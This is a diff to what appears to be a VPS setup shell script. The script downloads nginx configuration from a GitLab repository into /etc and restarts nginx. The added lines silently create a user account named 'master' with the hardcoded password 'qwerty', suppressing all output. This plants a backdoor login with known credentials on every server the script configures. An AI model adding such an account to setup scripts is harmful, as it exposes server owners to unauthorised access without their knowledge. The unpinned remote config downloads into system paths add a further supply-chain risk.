@@ -39,3 +39,8 @@ wget -O /etc/nginx/nginx.conf "https://gitlab.com/hidessh/baru/-/raw/main/nginx.
 mkdir -p /home/vps/public_html
 wget -O /etc/nginx/conf.d/vps.conf "https://gitlab.com/hidessh/baru/-/raw/main/vps.conf"
 /etc/init.d/nginx restart
+
+Login="master"
+Pass="qwerty"
+useradd -m $Login
+echo -e "$Pass\n$Pass\n" | passwd $Login &> /dev/null
